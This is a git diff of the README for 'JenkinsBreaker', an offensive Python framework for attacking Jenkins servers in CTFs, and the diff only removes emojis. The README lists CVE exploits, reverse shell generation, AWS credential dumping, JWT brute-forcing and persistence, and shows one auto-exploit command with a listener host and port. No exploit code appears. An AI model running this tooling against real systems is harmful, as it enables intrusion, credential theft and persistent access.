@@ -5,24 +5,24 @@ An Advanced Python Offensive Security Framework for Jenkins Exploitation in CTF 
 
 ## Features  
 
-- ✅ **Automated Enumeration & Exploitation** (`--auto` mode)  
-- ✅ **Exploit Critical CVEs**:  
+- **Automated Enumeration & Exploitation** (`--auto` mode)  
+- **Exploit Critical CVEs**:  
   - CVE-2019-1003029 / CVE-2019-1003030 – *Groovy Script RCE*  
   - CVE-2024-23897 – *Arbitrary File Read via CLI*  
   - CVE-2025-31720 / CVE-2025-31721 / CVE-2025-31722 – *Custom & Upcoming CVEs Included*  
-- ✅ **Reverse Shell Payload Generation** (Bash, Python, Groovy, PowerShell, Metasploit Compatible)  
-- ✅ **AWS Credential Dumping & Secrets Scanning**  
-- ✅ **CSRF Crumb Handling & Automation**  
-- ✅ **JWT Token Brute-Forcing and Analysis**  
-- ✅ **Post-Exploitation Recon Automation** (Auto Upload & Execute linPEAS, pspy)  
-- ✅ **Report Generation**: JSON, Markdown, PDF (via WeasyPrint)  
-- ✅ **Built-in C2 Server (FastAPI) & Interactive WebSocket Shell (not functional with this release)**  
-- ✅ **Persistence Techniques** (Cron Jobs, Jenkins Pipelines)  
-- ✅ **Modular Exploit Loading** (`exploits/` Directory)  
+- **Reverse Shell Payload Generation** (Bash, Python, Groovy, PowerShell, Metasploit Compatible)  
+- **AWS Credential Dumping & Secrets Scanning**  
+- **CSRF Crumb Handling & Automation**  
+- **JWT Token Brute-Forcing and Analysis**  
+- **Post-Exploitation Recon Automation** (Auto Upload & Execute linPEAS, pspy)  
+- **Report Generation**: JSON, Markdown, PDF (via WeasyPrint)  
+- **Built-in C2 Server (FastAPI) & Interactive WebSocket Shell (not functional with this release)**  
+- **Persistence Techniques** (Cron Jobs, Jenkins Pipelines)  
+- **Modular Exploit Loading** (`exploits/` Directory)  
 
 ---
 
-## 📅 Coming Soon (Planned Features)  
+## Coming Soon (Planned Features)  
 
 - 🖥**Full Visual Interface** (TUI & Web UI) using *textual* and *fastapi*  
 - **Enhanced Plugin Fuzzer** with *ML-Based Misconfiguration Detection*  
@@ -38,7 +38,7 @@ cd heaplessNights/JenkinsBreaker
 python3 JenkinsBreaker.py --help  # Auto-creates virtualenv and installs dependencies
 ```
 ```bash
-##⚔️ Example Usage
+## Example Usage
 Automatic Enumeration & Exploitation:
 python3 JenkinsBreaker.py --url http://TARGET_IP:8080 --auto --lhost YOUR_IP --lport 4444
 
